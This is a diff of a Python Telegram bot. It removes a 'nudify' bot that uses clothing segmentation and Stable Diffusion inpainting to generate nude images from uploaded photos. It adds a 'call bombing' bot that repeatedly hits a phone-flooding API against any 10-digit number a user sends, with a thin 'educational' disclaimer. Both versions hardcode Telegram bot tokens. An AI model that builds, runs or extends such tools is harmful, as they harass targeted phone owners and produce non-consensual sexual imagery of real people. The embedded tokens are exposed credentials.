@@ -1,159 +1,268 @@
+import asyncio
+import aiohttp
+import sqlite3
 import os
-import logging
-import time
-import base64
-import threading
-from http.server import HTTPServer, BaseHTTPRequestHandler
-from io import BytesIO
+from datetime import datetime
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
-from telegram.ext import Application, CommandHandler, MessageHandler, filters, CallbackContext
-from PIL import Image
-import cv2
-import numpy as np
-import torch
-from diffusers import StableDiffusionInpaintPipeline
-from transformers import AutoImageProcessor, UperNetForSemanticSegmentation
+from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes, CallbackQueryHandler, MessageHandler, filters
 
-# ---------- CONFIG ----------
-TOKEN = "9143295973:AAGRCn-GHHJMMylM086i2V8c8wqgX9BAxNI"
-logging.basicConfig(level=logging.INFO)
-logger = logging.getLogger(__name__)
+# Bot Configuration
+TOKEN = "9138425561:AAES9f2Ioj_ya-I_vXKIABeON7kFRTi543Q"
+OWNER_CHAT_ID = 6684734209
 
-# ---------- RENDER WEB PORT FIX ----------
-class HealthCheckHandler(BaseHTTPRequestHandler):
-    def do_GET(self):
-        self.send_response(200)
-        self.end_headers()
-        self.wfile.write(b"Bot is alive and running!")
-    def log_message(self, format, *args):
-        pass
+# API
+CALL_BOMBR_API = "https://fast-bomber-chodachodi.vercel.app/?mobile={mobile}"
 
-def run_health_server():
-    port = int(os.environ.get("PORT", 10000))
-    server = HTTPServer(("0.0.0.0", port), HealthCheckHandler)
-    server.serve_forever()
-
-# ---------- LOAD MODELS ----------
-logger.info("🔥 DAS Loading segmentation model...")
-processor = AutoImageProcessor.from_pretrained("openmmlab/upernet-convnext-small")
-seg_model = UperNetForSemanticSegmentation.from_pretrained("openmmlab/upernet-convnext-small")
-
-logger.info("🔥 DAS Loading inpainting pipeline...")
-device = "cuda" if torch.cuda.is_available() else "cpu"
-pipe = StableDiffusionInpaintPipeline.from_pretrained(
-    "runwayml/stable-diffusion-inpainting",
-    torch_dtype=torch.float16 if device=="cuda" else torch.float32
-)
-pipe = pipe.to(device)
-
-# ---------- CORE FUNCTION – ULTIMATE ----------
-def undress_and_internal(image_bytes):
-    img = Image.open(BytesIO(image_bytes)).convert("RGB")
-    inputs = processor(images=img, return_tensors="pt")
+# Database setup
+def init_db():
+    if os.path.exists('bot.db'):
+        os.remove('bot.db')
     
-    with torch.no_grad():
-        outputs = seg_model(**inputs)
-    seg_map = outputs.logits.argmax(dim=1).squeeze().cpu().numpy()
+    conn = sqlite3.connect('bot.db')
+    cursor = conn.cursor()
     
-    # Full clothing removal mask
-    clothing_ids = [5,6,7,8,9,10,12,13,14,15]  # sab kuch
-    mask = np.isin(seg_map, clothing_ids).astype(np.uint8) * 255
-    mask_pil = Image.fromarray(mask)
-    
-    # 🔥 Sexy prompt – novel grade
-    prompt = "perfect nude female body, realistic skin texture, detailed anatomy, no clothes, sensual pose, photorealistic, high quality"
-    nude = pipe(
-        prompt=prompt,
-        image=img,
-        mask_image=mask_pil,
-        height=512,
-        width=512,
-        num_inference_steps=35,
-        guidance_scale=8.0,
-    ).images[0]
-    
-    # Internal X-ray overlay + color enhancement for "sexy" glow
-    nude_cv = cv2.cvtColor(np.array(nude), cv2.COLOR_RGB2BGR)
-    gray = cv2.cvtColor(nude_cv, cv2.COLOR_BGR2GRAY)
-    _, internal_mask = cv2.threshold(gray, 110, 255, cv2.THRESH_BINARY)
-    internal_colored = cv2.applyColorMap(internal_mask, cv2.COLORMAP_MAGMA)  # sexy hot map
-    
-    # Glow effect
-    glow = cv2.GaussianBlur(internal_colored, (21, 21), 0)
-    blended = cv2.addWeighted(nude_cv, 0.7, glow, 0.3, 0)
-    
-    # Extra contrast for "pop"
-    blended = cv2.convertScaleAbs(blended, alpha=1.2, beta=10)
-    
-    _, buffer = cv2.imencode(".png", blended)
-    return BytesIO(buffer)
-
-# ---------- BOT COMMANDS ----------
-async def start(update: Update, context: CallbackContext):
-    keyboard = [[InlineKeyboardButton("💀 DAS WILL RISE 💀", callback_data="rise")]]
-    reply_markup = InlineKeyboardMarkup(keyboard)
-    await update.message.reply_text(
-        "👿 **DAS WILL RISE – ULTIMATE** 👿\n\n"
-        "🔥 Send me a **photo** and I will:\n"
-        "1️⃣ Remove ALL clothing\n"
-        "2️⃣ Generate sexy nude body\n"
-        "3️⃣ Add internal X-ray glow\n"
-        "4️⃣ Give you the final HOT image\n\n"
-        "⚠️ Pure fiction – for your novel only.",
-        reply_markup=reply_markup,
-        parse_mode="Markdown"
-    )
-
-async def handle_image(update: Update, context: CallbackContext):
-    user = update.message.from_user
-    logger.info(f"Request from {user.first_name} (@{user.username})")
-    
-    photo = update.message.photo[-1]
-    file = await photo.get_file()
-    image_bytes = await file.download_as_bytearray()
-    
-    msg = await update.message.reply_text(
-        "⏳ **DAS PROCESSING...**\n"
-        "🔍 Detecting garments...\n"
-        "🧠 Generating nude form...\n"
-        "🦴 Adding internal structure...\n"
-        "✨ Enhancing for sexy output...",
-        parse_mode="Markdown"
-    )
-    
-    try:
-        result_buffer = undress_and_internal(image_bytes)
-        
-        await update.message.reply_photo(
-            photo=result_buffer,
-            caption="✅ **COMPLETE – DAS WILL RISE** ✅\n\n"
-                   "👅 Clothing fully removed.\n"
-                   "🔥 Internal glow applied.\n"
-                   "💀 Sexy output ready.",
-            parse_mode="Markdown"
+    cursor.execute('''
+        CREATE TABLE IF NOT EXISTS users (
+            user_id INTEGER PRIMARY KEY,
+            join_date TEXT,
+            is_blocked INTEGER DEFAULT 0
         )
-        await msg.delete()
-        
-    except Exception as e:
-        logger.error(f"Error: {e}")
-        await update.message.reply_text("❌ Error – try again with clearer image.")
+    ''')
+    
+    cursor.execute('''
+        CREATE TABLE IF NOT EXISTS settings (
+            id INTEGER PRIMARY KEY,
+            maintenance_mode INTEGER DEFAULT 0
+        )
+    ''')
+    
+    cursor.execute('INSERT OR IGNORE INTO settings (id, maintenance_mode) VALUES (1, 0)')
+    
+    conn.commit()
+    conn.close()
+    print("✅ Database initialized successfully!")
 
-async def button_callback(update: Update, context: CallbackContext):
+def get_user(user_id):
+    conn = sqlite3.connect('bot.db')
+    cursor = conn.cursor()
+    cursor.execute('SELECT * FROM users WHERE user_id = ?', (user_id,))
+    user = cursor.fetchone()
+    conn.close()
+    return user
+
+def add_user(user_id):
+    conn = sqlite3.connect('bot.db')
+    cursor = conn.cursor()
+    cursor.execute('SELECT * FROM users WHERE user_id = ?', (user_id,))
+    if not cursor.fetchone():
+        cursor.execute(
+            'INSERT INTO users (user_id, join_date, is_blocked) VALUES (?, ?, ?)',
+            (user_id, datetime.now().isoformat(), 0)
+        )
+    conn.commit()
+    conn.close()
+
+def get_all_users():
+    conn = sqlite3.connect('bot.db')
+    cursor = conn.cursor()
+    cursor.execute('SELECT * FROM users')
+    users = cursor.fetchall()
+    conn.close()
+    return users
+
+def get_settings():
+    conn = sqlite3.connect('bot.db')
+    cursor = conn.cursor()
+    cursor.execute('SELECT * FROM settings WHERE id = 1')
+    settings = cursor.fetchone()
+    conn.close()
+    return settings
+
+# Dictionary to track running tasks
+running_tasks = {}
+
+# Start command with long welcome message
+async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+    add_user(user_id)
+    
+    welcome_message = (
+        "🔥 **WELCOME TO THE ULTIMATE SPEED BOMBING BOT** 🔥\n\n"
+        "⚡ Yeh bot high-performance fast API par kaam karta hai jo target par non-stop requests bhej sakta hai.\n\n"
+        "🎯 **Available Features:**\n"
+        "• 📞 **Fast Call Bombing:** Target number par instant continuous calls.\n"
+        "• 🛑 **Easy Control:** Kabhi bhi bombing rokne ke liye bas `stop` command bhejein ya Stop button dabayein.\n"
+        "• 🚀 **Zero Restrictions:** Koi referral nahi, koi coin system nahi, bilkul free aur direct access!\n\n"
+        "👇 **Kaise Use Karein?**\n"
+        "Bas apna target phone number yahan type karke bhej dein (jaise: `9876543210`), aur bombing shuru ho jayegi!\n\n"
+        "⚠️ *Disclaimer: Yeh bot sirf educational aur testing purposes ke liye banaya gaya hai.*"
+    )
+    
+    keyboard = [
+        [InlineKeyboardButton("📞 Start Bombing", callback_data="start_bomb_menu")],
+        [InlineKeyboardButton("💬 Contact Owner", url="https://t.me/Gauravcyber_op")]
+    ]
+    reply_markup = InlineKeyboardMarkup(keyboard)
+    
+    await update.message.reply_text(welcome_message, reply_markup=reply_markup, parse_mode='Markdown')
+
+# Main Menu from query
+async def show_main_menu_from_query(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query
+    welcome_message = (
+        "🔥 **ULTIMATE SPEED BOMBING BOT MENU** 🔥\n\n"
+        "🎯 Target par bombing shuru karne ke liye apna 10-digit ka mobile number bhejhein.\n"
+        "🛑 Bombing rokne ke liye **stop** likhkar bhejein."
+    )
+    keyboard = [
+        [InlineKeyboardButton("📞 How to Use", callback_data="help_info")],
+        [InlineKeyboardButton("💬 Contact Owner", url="https://t.me/Gauravcyber_op")]
+    ]
+    reply_markup = InlineKeyboardMarkup(keyboard)
+    await query.edit_message_text(welcome_message, reply_markup=reply_markup, parse_mode='Markdown')
+
+# Help info callback
+async def help_info(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
     await query.answer()
-    await query.edit_message_text("💀 **DAS WILL RISE – ACTIVE** 💀")
+    await query.edit_message_text(
+        "📖 **GUIDE:**\n\n"
+        "1. Direct apna 10 digit mobile number chat me bhejein.\n"
+        "2. Bombing start ho jayegi.\n"
+        "3. Beech me rokne ke liye `stop` command ka use karein.",
+        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="main_menu")]])
+    )
 
-# ---------- MAIN ----------
-def main():
-    # Start health check server for Render port binding
-    threading.Thread(target=run_health_server, daemon=True).start()
-
-    app = Application.builder().token(TOKEN).build()
-    app.add_handler(CommandHandler("start", start))
-    app.add_handler(MessageHandler(filters.PHOTO, handle_image))
-    app.add_handler(CallbackQueryHandler(button_callback, pattern="rise"))
+# Message handler for targets and stop command
+async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+    message_text = update.message.text.strip()
     
-    logger.info("🔥 DAS BOT ULTIMATE RUNNING...")
+    # Check stop command via text
+    if message_text.lower() == 'stop':
+        task = running_tasks.pop(user_id, None)
+        if task:
+            task.cancel()
+            await update.message.reply_text("🛑 **BOMBING SUCCESSFULLY STOPPED!** 🛑")
+        else:
+            await update.message.reply_text("⚠️ Koi active bombing nahi chal rahi hai.")
+        return
+
+    # Check if input is a valid mobile number (10 digits)
+    if message_text.isdigit() and len(message_text) == 10:
+        if user_id in running_tasks:
+            await update.message.reply_text("⚠️ Pehle se ek bombing chal rahi hai! Use rokne ke liye **stop** bhejein.")
+            return
+            
+        phone = message_text
+        processing_msg = await update.message.reply_text(
+            f"🚀 **BOMBING STARTED** 🚀\n\n"
+            f"🎯 Target: `{phone}`\n"
+            f"⚡ Status: Running...\n\n"
+            f"🛑 Rokne ke liye **stop** bhejein ya niche button dabayein.",
+            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🛑 STOP BOMBING", callback_data=f"stop_bomb_{user_id}")]])
+        )
+        
+        # Start background task
+        task = asyncio.create_task(send_bomb_requests(update, phone, user_id, processing_msg))
+        running_tasks[user_id] = task
+    else:
+        await update.message.reply_text("❌ Kripya sahi 10-digit ka mobile number bhejein ya command use karein.")
+
+# Background Bomb Request Worker
+async def send_bomb_requests(update: Update, phone: str, user_id: int, processing_msg):
+    successful = 0
+    start_time = datetime.now()
+    
+    async with aiohttp.ClientSession() as session:
+        while user_id in running_tasks:
+            try:
+                async with session.get(CALL_BOMBR_API.format(mobile=phone)) as response:
+                    await response.text()
+                successful += 1
+                
+                elapsed = int((datetime.now() - start_time).total_seconds())
+                
+                # Update status every 15 seconds
+                if elapsed > 0 and elapsed % 15 == 0:
+                    keyboard = InlineKeyboardMarkup([[InlineKeyboardButton("🛑 STOP BOMBING", callback_data=f"stop_bomb_{user_id}")]])
+                    try:
+                        await update.message.reply_text(
+                            f"📊 **BOMBING STATUS UPDATE** 📊\n\n"
+                            f"📞 Target: `{phone}`\n"
+                            f"⏰ Active Time: {elapsed}s\n"
+                            f"✅ Requests Sent: {successful}\n"
+                            f"🚀 Status: Ongoing...",
+                            reply_markup=keyboard
+                        )
+                    except:
+                        pass
+            except Exception:
+                pass
+                
+            await asyncio.sleep(1)
+            
+    final_end_time = datetime.now()
+    total_duration = int((final_end_time - start_time).total_seconds())
+    
+    try:
+        await update.message.reply_text(
+            f"🏁 **BOMBING FINISHED / STOPPED** 🏁\n\n"
+            f"📞 Target: `{phone}`\n"
+            f"⏱️ Total Duration: {total_duration} seconds\n"
+            f"✅ Total Requests Sent: {successful}"
+        )
+    except:
+        pass
+
+# Stop callback handler
+async def stop_bomb_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query
+    user_id = query.from_user.id
+    data = query.data
+    
+    if data.startswith('stop_bomb_'):
+        try:
+            target_user_id = int(data.split('_')[2])
+            if user_id == target_user_id or user_id == OWNER_CHAT_ID:
+                task = running_tasks.pop(target_user_id, None)
+                if task:
+                    task.cancel()
+                    await query.answer("🛑 Bombing Stopped Successfully!", show_alert=True)
+                    await query.edit_message_text("🛑 **BOMBING STOPPED BY USER!** 🛑")
+                else:
+                    await query.answer("⚠️ No active bombing found.", show_alert=True)
+            else:
+                await query.answer("❌ Aap isse nahi rok sakte!", show_alert=True)
+        except Exception:
+            await query.answer("❌ Error stopping bombing!", show_alert=True)
+
+# Callback query router
+async def handle_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query
+    
+    if query.data.startswith('stop_bomb_'):
+        await stop_bomb_callback(update, context)
+        return
+        
+    await query.answer()
+    if query.data == "start_bomb_menu":
+        await query.edit_message_text("📞 **Target Number Bhejein:**\n\nKripya seedha 10 digit ka mobile number type karke send karein.")
+    elif query.data == "help_info":
+        await help_info(update, context)
+    elif query.data == "main_menu":
+        await show_main_menu_from_query(update, context)
+
+# Main execution loop
+def main():
+    init_db()
+    app = ApplicationBuilder().token(TOKEN).build()
+
+    app.add_handler(CommandHandler("start", start))
+    app.add_handler(CallbackQueryHandler(handle_callback))
+    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
+
+    print("🎯 Clean Speed Bombing Bot is running...")
     app.run_polling()
 
 if __name__ == "__main__":
